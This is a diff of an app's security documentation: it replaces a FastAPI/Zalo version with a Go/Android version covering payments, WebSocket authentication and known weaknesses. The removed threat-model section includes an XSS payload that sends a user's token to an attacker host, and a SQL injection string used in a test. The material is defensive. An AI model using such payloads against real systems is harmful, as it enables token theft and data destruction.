-if payer_wallet.available_balance < amount:
-    return {
-        "success": False,
-        "error": f"Số dư không đủ. Cần {amount:,}đ, hiện có {payer_wallet.available_balance:,}đ"
+    // Verify webhook signature
+    verifiedData, err := h.payos.VerifyWebhookData(c.Request.Context(), webhookData)
+    if err != nil {
+        c.JSON(http.StatusUnauthorized, gin.H{"code": "01", "desc": "Invalid webhook signature"})
+        return
     }
+    // Process verified data...
+}
 ```
 
-**Wallet Balance Types:**
+On signature failure, the webhook returns 401. On success, it returns 200 with `{"code": "00", "desc": "success"}`.
 
-```python
-# backend/app/models/wallet.py (inferred)
-@property
-def available_balance(self) -> int:
-    """Balance minus frozen amount."""
-    return self.balance - self.frozen_balance
+**Source:** `server/internal/handlers/webhook.go:41-93`
+
+### 7.3 Idempotency Guard
+
+The webhook handler checks if a transaction has already been marked successful before processing, preventing double-crediting on webhook retries:
+
+```go
+if transaction.Status == models.TransactionStatusSuccess {
+    log.Printf("Transaction %d already successful, skipping", transaction.ID)
+    return nil
+}
 ```
 
-### 7.4 Mock vs Real Payment Modes
+**Source:** `server/internal/handlers/webhook.go:132-136`
 
-**Location:** `backend/app/config.py:78-80`
-
-```python
-# Mock Payment (for development)
-MOCK_PAYMENT_ENABLED: bool = True  # Set to False when ZaloPay is approved
-MOCK_INITIAL_BALANCE: int = 1000000  # 1,000,000 VND initial balance for new users
-```
-
-**Mock Payment Security:**
-
-✅ **Safe for Development:**
-- Virtual wallets (no real money)
-- Isolated test environment
-- Transaction logging
-
-⚠️ **Production Risks:**
-- Must disable before launch
-- No real payment validation
-- Fraud potential if exposed
-
-**Real Payment (ZaloPay):**
-
-See [ZALOPAY_INTEGRATION.md](./ZALOPAY_INTEGRATION.md) for:
-- MAC signature verification
-- Callback authentication
-- Payment status validation
-- Refund handling
-
-### 7.5 Platform Fee Calculation
-
-**Location:** `backend/app/services/mock_payment.py:241-243`
-
-```python
-# Calculate fees
-platform_fee = (amount * self.platform_fee_percent) // 100
-tasker_amount = amount - platform_fee
-```
-
-**Configuration:**
-
-```python
-# backend/app/config.py:74
-PLATFORM_FEE_PERCENT: int = 10  # 10% platform fee
-```
-
-**Example:**
+### 7.4 Escrow Payment Model
 
 ```
-Task Price:     100,000đ
-Platform Fee:   10,000đ (10%)
-Tasker Receives: 90,000đ
+1. Requester creates escrow  -->  Funds held in escrow (wallet or PayOS)
+2. Task completed             -->  Release: net amount to tasker wallet
+3. Platform fee               -->  Separate fee transaction recorded
+4. Task cancelled             -->  Full refund to requester wallet
 ```
 
-### 7.6 Payment Authorization
+Authorization enforcement:
+- `CreateEscrowPayment`: `task.RequesterID != payerID` check
+- `ReleasePayment`: `task.RequesterID != requesterID` check + task must be in-progress + tasker must be assigned
+- `RefundPayment`: `task.RequesterID != requesterID` check + task must be in-progress
 
-**Pattern:** Only requester can release payment
+**Source:** `server/internal/services/payment.go`
 
-```python
-# backend/app/routers/payments.py (inferred)
-@router.post("/release/{task_id}")
-async def release_payment(
-    task_id: int,
-    db: Session = Depends(get_db),
-    current_user: User = Depends(get_current_user)
-):
-    task = db.query(Task).filter(Task.id == task_id).first()
+### 7.5 Wallet Balance Limits
 
-    # Authorization check
-    if task.requester_id != current_user.id:
-        raise HTTPException(
-            status_code=status.HTTP_403_FORBIDDEN,
-            detail="Not authorized"
-        )
+- **Minimum deposit:** 2,000 VND (enforced by Gin binding `min=2000`)
+- **Maximum wallet balance:** 200,000 VND by default (configurable via `MAX_WALLET_BALANCE` env var)
+- Deposit is rejected if `wallet.Balance + amount > maxWalletBalance`
 
-    # Only release if task completed
-    if task.status != TaskStatus.COMPLETED.value:
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Task must be completed first"
-        )
-```
+**Source:** `server/internal/services/wallet.go:64-65`, `server/internal/handlers/wallet.go:75`
+
+### 7.6 Mock vs Real Payment Mode
+
+Controlled by `PAYMENT_MOCK_MODE` env var:
+
+| Mode | Behavior | Use Case |
+|------|----------|----------|
+| Mock (`true`) | Escrow/release uses wallet service directly, no PayOS | Development, E2E tests |
+| Real (`false`) | Creates PayOS payment links, processes real webhooks | Production |
+
+The test server (`cmd/testserver/main.go`) uses a `mockPayOS` that auto-fires webhooks after 100ms to simulate instant payment completion.
 
 ---
 
 ## 8. WebSocket Security
 
-### 8.1 Token Validation in WebSocket
+### 8.1 Connection Authentication
 
-**Location:** `backend/app/websocket/chat.py:62-65`
+WebSocket connections authenticate via JWT token passed as a query parameter or `Authorization` header:
 
-```python
-# Authenticate
-user = await get_user_from_token(token, db)
-if not user:
-    await websocket.close(code=4001, reason="Unauthorized")
+```
+GET /api/v1/ws?token=<jwt_access_token>
+```
+
+The handler validates the JWT before upgrading the HTTP connection:
+
+```go
+claims, err := auth.ValidateToken(tokenString, h.jwtSecret)
+if err != nil {
+    c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid token"})
     return
+}
 ```
 
-#### Token Verification Function
+**Source:** `server/internal/handlers/websocket.go:42-82`
 
-```python
-# backend/app/websocket/chat.py:21-31
+### 8.2 Origin Checking
 
-async def get_user_from_token(token: str, db: Session) -> User | None:
-    """Verify token and get user."""
-    payload = verify_token(token)
-    if not payload:
-        return None
+The WebSocket upgrader currently accepts all origins:
 
-    user_id = payload.get("sub")
-    if not user_id:
-        return None
-
-    return db.query(User).filter(User.id == int(user_id)).first()
+```go
+CheckOrigin: func(r *http.Request) bool {
+    // TODO: In production, check origin properly
+    return true
+},
 ```
 
-### 8.2 Connection Authorization
+This is a known limitation that should be hardened before production.
 
-**Location:** `backend/app/websocket/chat.py:67-75`
+**Source:** `server/internal/handlers/websocket.go:18-21`
 
-```python
-# Verify user has access to task
-task = db.query(Task).filter(Task.id == task_id).first()
-if not task:
-    await websocket.close(code=4004, reason="Task not found")
-    return
+### 8.3 Conversation Access Control
 
-if task.requester_id != user.id and task.tasker_id != user.id:
-    await websocket.close(code=4003, reason="Forbidden")
-    return
+Every WebSocket message action verifies the sender is a participant in the conversation:
+
+```go
+if conversation.PosterID != client.UserID && conversation.TaskerID != client.UserID {
+    return errors.New("user not authorized to send messages in this conversation")
+}
 ```
 
-**Authorization Logic:**
+This check applies to: sending messages, typing indicators, joining conversations, and reading message history.
 
-- User must be either requester OR tasker
-- Task must exist
-- Custom close codes for different errors
+**Source:** `server/internal/services/message.go:63-65, 117-119, 166-168, 196-198`
 
-### 8.3 Message Sender Verification
+### 8.4 WebSocket Limits
 
-**Location:** `backend/app/websocket/chat.py:99-107`
+| Parameter | Value |
+|-----------|-------|
+| Max message size | 512 KB |
+| Write timeout | 10 seconds |
+| Pong wait | 60 seconds |
+| Ping period | 54 seconds |
+| Send buffer | 256 messages |
 
-```python
-# Determine receiver
-receiver_id = task.tasker_id if task.requester_id == user.id else task.requester_id
-
-if not receiver_id:
-    await websocket.send_json({
-        "type": "error",
-        "message": "No recipient available"
-    })
-    continue
-```
-
-**Security Features:**
-
-- Sender verified via JWT
-- Receiver derived from task relationship
-- Cannot spoof sender ID
-- Only 2-party conversations
-
-### 8.4 WebSocket Endpoint
-
-**Location:** `backend/app/main.py:108-119`
-
-```python
-@app.websocket("/ws/chat/{task_id}")
-async def websocket_chat_endpoint(
-    websocket: WebSocket,
-    task_id: int,
-    token: str = Query(...)
-):
-    """WebSocket endpoint for task chat."""
-    db = next(get_db())
-    try:
-        await chat_websocket(websocket, task_id, token, db)
-    finally:
-        db.close()
-```
-
-**Connection URL:**
-
-```
-ws://localhost:8000/ws/chat/{task_id}?token=<jwt_access_token>
-```
-
-**Security Considerations:**
-
-⚠️ **Token in Query String:**
-- Visible in logs
-- Visible in network tools
-- Cannot use Authorization header with WebSocket
-
-✅ **Mitigations:**
-- Short token expiry (15 minutes)
-- Token validated on connection
-- Connection closed on invalid token
+**Source:** `server/internal/websocket/client.go:12-24`
 
 ---
 
-## 9. Known Vulnerabilities
+## 9. Token Storage (Android)
 
-### 9.1 DEBUG Mode Endpoints
+### 9.1 EncryptedSharedPreferences
 
-**Risk:** Information disclosure, unauthorized access
+Tokens are stored using Android's `EncryptedSharedPreferences` with AES-256 encryption:
 
-**Affected Endpoints:**
+```kotlin
+private val masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
 
-```python
-# backend/app/main.py:55-56
-docs_url="/docs" if settings.DEBUG else None,
-redoc_url="/redoc" if settings.DEBUG else None,
-
-# backend/app/routers/auth.py:196-209
-@router.post("/dev-login", response_model=TokenResponse)
-async def dev_login(name: str = "Test User", db: Session = Depends(get_db)):
-    if not settings.DEBUG:
-        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Not found")
+private val prefs: SharedPreferences = EncryptedSharedPreferences.create(
+    "encrypted_auth_prefs",
+    masterKeyAlias,
+    context,
+    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,    // key encryption
+    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM   // value encryption
+)
 ```
 
-**Exposed Information:**
+**Stored values:** `access_token`, `refresh_token`, `user_id`, `user_email`, `user_name`
 
-- API structure (/docs)
-- Endpoint parameters
-- Schema definitions
-- Example payloads
+**Source:** `android/app/src/main/java/com/viecz/vieczandroid/data/local/TokenManager.kt`
 
-**Mitigation:**
+### 9.2 AuthInterceptor
 
-```bash
-# Production .env
-DEBUG=false
+An OkHttp interceptor automatically attaches the access token to all API requests:
+
+```kotlin
+val request = originalRequest.newBuilder()
+    .addHeader("Authorization", "Bearer $token")
+    .build()
 ```
 
-**Impact:**
+On receiving a 401 response (except for `/auth/login` and `/auth/register` endpoints), the interceptor:
+1. Clears all stored tokens
+2. Emits an unauthorized event to trigger re-login in the UI
 
-- Low (hidden when DEBUG=false)
-- Returns 404 in production
-
-### 9.2 Mock Payment Mode
-
-**Risk:** Financial fraud, unauthorized transactions
-
-**Configuration:**
-
-```python
-# backend/app/config.py:79
-MOCK_PAYMENT_ENABLED: bool = True
-```
-
-**Vulnerabilities:**
-
-- Virtual money not validated
-- No real payment gateway
-- Unlimited balance generation
-- No transaction verification
-
-**Mitigation:**
-
-```bash
-# Production .env
-MOCK_PAYMENT_ENABLED=false
-```
-
-**Pre-Production Checklist:**
-
-- [ ] Disable mock payment
-- [ ] Enable ZaloPay integration
-- [ ] Test real payment flow
-- [ ] Remove mock wallet endpoints
-
-### 9.3 SQLite Limitations
-
-**Risk:** Concurrency issues, file corruption
-
-**Current Setup:**
-
-```python
-# backend/app/config.py:43
-DATABASE_URL: str = "sqlite:///./data/viecz.db"
-```
-
-**Limitations:**
-
-- Single-writer lock
-- No concurrent writes
-- File-based (corruption risk)
-- Limited transaction isolation
-
-**Production Recommendation:**
-
-```python
-# PostgreSQL
-DATABASE_URL = "postgresql://user:pass@host:5432/viecz"
-```
-
-**Migration Priority:** High (before launch)
-
-### 9.4 JWT Secret in .env
-
-**Risk:** Token forgery if .env leaked
-
-**Current:**
-
-```bash
-# .env
-JWT_SECRET=change-this-secret-key-in-production
-```
-
-**Vulnerabilities:**
-
-- Weak default secret
-- Stored in plaintext file
-- Could be committed to git
-- Shared across environments
-
-**Mitigation:**
-
-```bash
-# Generate strong secret
-python -c "import secrets; print(secrets.token_urlsafe(64))"
-
-# Store in secure vault
-# - AWS Secrets Manager
-# - HashiCorp Vault
-# - Environment variable from CI/CD
-```
-
-### 9.5 CORS Wildcard Methods
-
-**Risk:** CSRF attacks, unauthorized API calls
-
-**Current:**
-
-```python
-allow_methods=["*"],
-allow_headers=["*"],
-```
-
-**Mitigation:**
-
-```python
-# Production
-allow_methods=["GET", "POST", "PUT", "DELETE"],
-allow_headers=["Content-Type", "Authorization"],
-```
-
-### 9.6 No Rate Limiting
-
-**Risk:** DoS attacks, brute force
-
-**Missing:**
-
-- Request rate limiting
-- Login attempt throttling
-- Payment request limiting
-
-**Recommended:**
-
-```python
-from slowapi import Limiter
-from slowapi.util import get_remote_address
-
-limiter = Limiter(key_func=get_remote_address)
-
-@app.post("/auth/zalo")
-@limiter.limit("5/minute")
-async def zalo_login(...):
-    pass
-```
-
-### 9.7 WebSocket Token in URL
-
-**Risk:** Token leakage in logs
-
-**Current:**
-
-```
-ws://host/ws/chat/{task_id}?token=<jwt>
-```
-
-**Visible in:**
-
-- Server access logs
-- Proxy logs
-- Browser history
-- Network monitoring tools
-
-**Mitigation:**
-
-- Use short-lived tokens (15 min)
-- Sanitize logs
-- Consider custom header (if supported by client)
+**Source:** `android/app/src/main/java/com/viecz/vieczandroid/data/api/AuthInterceptor.kt`
 
 ---
 
-## 10. Threat Modeling
+## 10. Known Limitations
 
-### 10.1 Threat Actors
+### 10.1 WebSocket Origin Check Disabled
 
-| Actor | Motivation | Capabilities | Likelihood |
-|-------|------------|--------------|------------|
-| **Malicious User** | Fraud, free services | Account creation, API access | High |
-| **Competitor** | Service disruption | DDoS, data scraping | Medium |
-| **Insider** | Data theft | Database access | Low |
-| **Script Kiddie** | Chaos | Automated tools | Medium |
+The WebSocket upgrader accepts all origins. Should be restricted to known origins in production.
 
-### 10.2 Attack Scenarios
+### 10.2 No Rate Limiting
 
-#### Scenario 1: Payment Fraud
+No rate limiting is implemented on any endpoint. Auth endpoints (login, register) are vulnerable to brute-force attacks.
 
-**Attack:**
+### 10.3 Refresh Token Not Rotated
 
-```
-1. Attacker creates task
-2. Accepts own application (alt account)
-3. Pays with mock wallet (if enabled)
-4. Marks task complete
-5. Receives payment to alt account
-```
+The `/auth/refresh` endpoint issues a new access token but does not rotate the refresh token. A stolen refresh token remains valid for its full 7-day lifetime.
 
-**Mitigations:**
+### 10.4 Refresh Token Uses Stale Claims
 
-- [ ] Disable mock payment in production
-- [ ] Implement identity verification (KYC)
-- [ ] Add fraud detection rules
-- [ ] Monitor suspicious patterns
-- [ ] Escrow holds funds
+The refresh handler reconstructs a user from token claims instead of fetching fresh data from the database. Role changes (e.g., becoming a tasker) are not reflected in new access tokens until the user logs in again.
 
-#### Scenario 2: Token Theft (XSS)
+### 10.5 JWT Secret Shared Between Access and Refresh Tokens
 
-**Attack:**
+Both token types use the same secret and same signing algorithm. There is no `type` claim to distinguish them. A refresh token could theoretically be used as an access token if the claims overlap sufficiently.
 
-```html
-<!-- Malicious task description -->
-<script>
-  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))
-</script>
-```
+### 10.6 Webhook Endpoint Is Public
 
-**Mitigations:**
+`POST /api/v1/payment/webhook` has no auth middleware (by design -- PayOS must reach it). Security relies entirely on the PayOS SDK signature verification.
 
-- [x] Pydantic validation prevents script tags
-- [x] React escapes user content by default
-- [x] API returns JSON only (no HTML)
-- [ ] Add Content Security Policy headers
-- [x] Short token expiry (15 min)
+### 10.7 Token in WebSocket Query String
 
-#### Scenario 3: SQL Injection
-
-**Attack:**
-
-```python
-# Vulnerable code (NOT PRESENT)
-task_id = "1; DROP TABLE users; --"
-db.execute(f"SELECT * FROM tasks WHERE id = {task_id}")
-```
-
-**Mitigations:**
-
-- [x] SQLAlchemy ORM prevents injection
-- [x] Parameterized queries
-- [x] Type validation (Pydantic)
-- [x] No raw SQL queries
-
-#### Scenario 4: Unauthorized Payment Release
-
-**Attack:**
-
-```
-1. Attacker intercepts task_id
-2. Calls POST /payments/release/{task_id}
-3. Attempts to release payment early
-```
-
-**Mitigations:**
-
-- [x] Authorization check (requester only)
-- [x] Status validation (must be COMPLETED)
-- [x] Resource ownership verification
-- [x] Transaction logging
-
-#### Scenario 5: WebSocket Eavesdropping
-
-**Attack:**
-
-```
-1. Attacker steals JWT token
-2. Connects to other users' chats
-3. Reads private messages
-```
-
-**Mitigations:**
-
-- [x] Token verification on connect
-- [x] Task participant check
-- [x] Token expiry (15 min)
-- [ ] Add rate limiting to WebSocket connections
-
-### 10.3 STRIDE Analysis
-
-| Threat | Example | Mitigation | Status |
-|--------|---------|------------|--------|
-| **Spoofing** | Fake user login | Zalo OAuth + JWT | ✅ Done |
-| **Tampering** | Modify payment amount | JWT signature, DB constraints | ✅ Done |
-| **Repudiation** | Deny task completion | Transaction logging | ✅ Done |
-| **Information Disclosure** | Leak user data | Authorization checks | ✅ Done |
-| **Denial of Service** | Flood API with requests | Rate limiting | ❌ Missing |
-| **Elevation of Privilege** | Tasker acts as Requester | Role checks | ✅ Done |
-
-### 10.4 Data Flow Diagram (DFD)
-
-```
-┌─────────────┐
-│ Zalo Mini   │
-│ App (User)  │
-└──────┬──────┘
-       │ HTTPS
-       │ JWT Token
-       ▼
-┌─────────────────────────────────────────────────────────┐
-│ FastAPI Backend                                          │
-│                                                           │
-│  ┌───────────────┐      ┌───────────────┐               │
-│  │ Auth Layer    │─────>│ Business      │               │
-│  │ (JWT + Zalo)  │      │ Logic         │               │
-│  └───────────────┘      └───────┬───────┘               │
-│                                  │                        │
-│                         ┌────────▼────────┐              │
-│                         │ SQLAlchemy ORM  │              │
-│                         └────────┬────────┘              │
-└──────────────────────────────────┼────────────────────────┘
-                                   │
-                          ┌────────▼────────┐
-                          │ SQLite Database │
-                          │ (File-based)    │
-                          └─────────────────┘
-
-External Services:
-┌─────────────┐    ┌─────────────┐
-│ Zalo Graph  │    │ ZaloPay API │
-│ API         │    │ (Payments)  │
-└─────────────┘    └─────────────┘
-```
-
-**Trust Boundaries:**
-
-1. **User ↔ Backend:** HTTPS, JWT authentication
-2. **Backend ↔ Database:** Local file access, ORM
-3. **Backend ↔ Zalo API:** HTTPS, appsecret_proof
-4. **Backend ↔ ZaloPay:** HTTPS, MAC signature
-
----
-
-## 11. Security Checklist
-
-### 11.1 Pre-Production Tasks
-
-**Authentication & Authorization:**
-
-- [ ] Rotate JWT_SECRET to strong random value
-- [ ] Store secrets in secure vault (not .env)
-- [ ] Disable DEBUG mode (`DEBUG=false`)
-- [ ] Remove /dev-login endpoint
-- [ ] Hide API docs (/docs, /redoc)
-- [ ] Implement rate limiting (5 req/min for auth)
-- [ ] Add account lockout after failed logins
-
-**Payment Security:**
-
-- [ ] Disable mock payment (`MOCK_PAYMENT_ENABLED=false`)
-- [ ] Integrate ZaloPay production credentials
-- [ ] Test real payment flow end-to-end
-- [ ] Verify MAC signature on callbacks
-- [ ] Implement idempotency for payments
-- [ ] Add transaction amount limits
-- [ ] Enable fraud detection rules
-
-**Data Protection:**
-
-- [ ] Migrate from SQLite to PostgreSQL
-- [ ] Enable database encryption at rest
-- [ ] Implement backup strategy
-- [ ] Sanitize logs (no tokens/secrets)
-- [ ] Add data retention policy
-- [ ] Implement GDPR compliance (if applicable)
-
-**Network Security:**
-
-- [ ] Use HTTPS only (no HTTP)
-- [ ] Update CORS to production origins only
-- [ ] Add security headers middleware
-- [ ] Whitelist ZaloPay callback IPs
-- [ ] Enable request logging
-- [ ] Implement IP-based rate limiting
-
-**Code Security:**
-
-- [ ] Run security linter (bandit)
-- [ ] Update all dependencies
-- [ ] Remove commented debug code
-- [ ] Add input sanitization tests
-- [ ] Review all SQL queries
-- [ ] Validate file upload security (if added)
-
-### 11.2 Environment Hardening
-
-**Production .env Template:**
-
-```bash
-# Server
-ENVIRONMENT=production
-DEBUG=false
-API_URL=https://api.viecz.vn
-
-# CORS (Production Mini App URL only)
-CORS_ORIGINS=["https://viecz.zalopay.vn"]
-
-# Database
-DATABASE_URL=postgresql://user:password@host:5432/viecz
-
-# JWT (Generate: python -c "import secrets; print(secrets.token_urlsafe(64))")
-JWT_SECRET=<64-character-random-string>
-JWT_ALGORITHM=HS256
-ACCESS_TOKEN_EXPIRE_MINUTES=15
-REFRESH_TOKEN_EXPIRE_DAYS=7
-
-# Zalo OAuth
-ZALO_APP_ID=<production-app-id>
-ZALO_APP_SECRET=<production-secret>
-ZALO_MINIAPP_ID=<production-miniapp-id>
-
-# ZaloPay
-ZALOPAY_APP_ID=<production-app-id>
-ZALOPAY_KEY1=<production-key1>
-ZALOPAY_KEY2=<production-key2>
-ZALOPAY_ENDPOINT=https://openapi.zalopay.vn/v2
-ZALOPAY_CALLBACK_URL=https://api.viecz.vn/api/v1/payments/zalopay/callback
-ZALOPAY_REDIRECT_URL=https://viecz.zalopay.vn/#/payment/result
-
-# Platform
-PLATFORM_FEE_PERCENT=10
-
-# Mock Payment (MUST BE FALSE)
-MOCK_PAYMENT_ENABLED=false
-
-# Logging
-LOG_LEVEL=INFO
-LOG_DIR=/var/log/viecz
-```
-
-### 11.3 Monitoring Requirements
-
-**Security Monitoring:**
-
-- [ ] Failed login attempts
-- [ ] Payment failures/retries
-- [ ] Unusual wallet activity
-- [ ] API rate limit violations
-- [ ] 401/403 error spikes
-- [ ] Database connection errors
-
-**Alerting:**
-
-```python
-# Example: Alert on multiple failed logins
-if failed_login_count > 5:
-    send_alert("Security", f"User {user_id} failed login 5 times")
-```
-
-**Log Aggregation:**
-
-- [ ] Send logs to centralized system (e.g., ELK, Splunk)
-- [ ] Retain logs for 90 days minimum
-- [ ] Set up alerts for critical errors
-- [ ] Monitor ZaloPay callback failures
-
-### 11.4 Incident Response Plan
-
-**Security Incident Types:**
-
-1. **Token Compromise:** User reports stolen token
-2. **Payment Fraud:** Suspicious transaction detected
-3. **Data Breach:** Unauthorized database access
-4. **API Abuse:** DDoS or scraping attack
-
-**Response Procedure:**
-
-```
-1. Detect: Monitor alerts, user reports
-2. Contain: Disable affected accounts, rotate secrets
-3. Investigate: Check logs, identify scope
-4. Remediate: Fix vulnerability, restore service
-5. Report: Notify affected users, document incident
-6. Review: Update security measures, prevent recurrence
-```
-
-### 11.5 Security Testing
-
-**Manual Testing:**
-
-```bash
-# Test authentication
-curl -X POST http://localhost:8000/api/v1/auth/zalo \
-  -H "Content-Type: application/json" \
-  -d '{"access_token": "invalid"}'
-
-# Test authorization
-curl -X GET http://localhost:8000/api/v1/users/me \
-  -H "Authorization: Bearer invalid-token"
-
-# Test input validation
-curl -X POST http://localhost:8000/api/v1/tasks \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"title": "", "price": -100}'
-```
-
-**Automated Testing:**
-
-```python
-# tests/security/test_auth.py
-
-def test_invalid_token_returns_401():
-    response = client.get("/api/v1/users/me", headers={"Authorization": "Bearer invalid"})
-    assert response.status_code == 401
-
-def test_sql_injection_prevented():
-    malicious_id = "1; DROP TABLE users; --"
-    response = client.get(f"/api/v1/tasks/{malicious_id}")
-    # Should return 422 (validation error) or 404, not 500
-    assert response.status_code in [422, 404]
-```
-
-### 11.6 Compliance & Auditing
-
-**Privacy:**
-
-- [ ] Privacy policy published
-- [ ] User data deletion procedure
-- [ ] GDPR consent (if EU users)
-- [ ] Data processing agreement
-
-**Financial:**
-
-- [ ] Transaction audit trail
-- [ ] Financial reconciliation
-- [ ] Tax reporting capability
-- [ ] Anti-money laundering checks
-
-**Security:**
-
-- [ ] Annual penetration test
-- [ ] Quarterly security review
-- [ ] Vulnerability disclosure policy
-- [ ] Security incident log
-
----
-
-## Appendix A: Security Tools
-
-### Recommended Tools
-
-**Static Analysis:**
-
-```bash
-# Install bandit
-pip install bandit
-
-# Scan for security issues
-bandit -r backend/app -ll
-```
-
-**Dependency Scanning:**
-
-```bash
-# Check for vulnerable dependencies
-pip install safety
-safety check --json
-```
-
-**Secrets Scanning:**
-
-```bash
-# Detect committed secrets
-pip install detect-secrets
-detect-secrets scan --all-files
-```
-
-**API Testing:**
-
-- **Postman:** Manual API testing
-- **OWASP ZAP:** Automated security scanning
-- **Burp Suite:** Web application testing
-
----
-
-## Appendix B: Security Contacts
-
-**Internal Team:**
-
-- Tech Lead: [Contact info]
-- Security Officer: [Contact info]
-- DevOps Engineer: [Contact info]
-
-**External Services:**
-
-- Zalo Support: https://developers.zalo.me/support
-- ZaloPay Support: merchants.zalopay.vn
-
-**Incident Reporting:**
-
-- Email: security@viecz.vn
-- Phone: [Emergency contact]
+JWT tokens passed via `?token=` are visible in server access logs and proxy logs. Mitigated by short (30-minute) token lifetime.
 
 ---
 
 ## Document History
 
-| Version | Date | Author | Changes |
-|---------|------|--------|---------|
-| 1.0 | 2026-02-04 | Tech Lead | Initial security documentation |
-
----
-
-**Confidential:** This document contains sensitive security information. Do not share publicly.
+| Version | Date | Changes |
+|---------|------|---------|
+| 2.0 | 2026-02-14 | Full rewrite to reflect Go backend + Android app (no Zalo, no FastAPI, no Python) |
+| 1.0 | 2026-02-04 | Initial security documentation (outdated) |
